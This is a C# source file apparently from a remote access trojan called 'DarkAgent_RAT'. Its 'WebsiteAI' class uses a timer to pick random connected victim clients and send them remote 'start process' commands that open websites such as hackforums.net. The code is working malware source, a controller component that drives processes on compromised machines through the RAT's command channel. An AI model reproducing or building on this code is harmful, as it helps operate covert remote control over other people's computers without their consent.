using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_RAT.src.Network.DataNetwork;
using DarkAgent_RAT.src.Network.DataNetwork.Packets.Send;
using System.Timers;

namespace DarkAgent_RAT.src.AI
{
    class WebsiteAI
    {
        List<string> websites;
        private System.Timers.Timer loopzor = new System.Timers.Timer();
        Random random = new Random();
        public bool Enabled
        {
            get { return loopzor.Enabled; }
            set {  loopzor.Enabled = value; }
        }

        public WebsiteAI()
        {
            websites = new List<string>();
            websites.Add("http://google.com");
            websites.Add("http://hackforums.net");
            websites.Add("http://leetcoders.org");

            loopzor.Elapsed += new ElapsedEventHandler(EventThink);
            loopzor.Interval = 1000;
        }

        private void EventThink(object source, ElapsedEventArgs e)
        {
            if(random.Next(0, 100) <= 5) //5% chance to send a website to a random client
            {
                //Get random client
                int i = random.Next(0, RatClientProcessor.Instance.ConnectedClientCount);
                if(RatClientProcessor.Instance._clientList.ContainsKey(i))
                    RatClientProcessor.Instance._clientList[i].SendPacket(new S_StartProcess(RatClientProcessor.Instance._clientList[i], websites[random.Next(0, websites.Count)] , 0));
            }
        }
    }
}
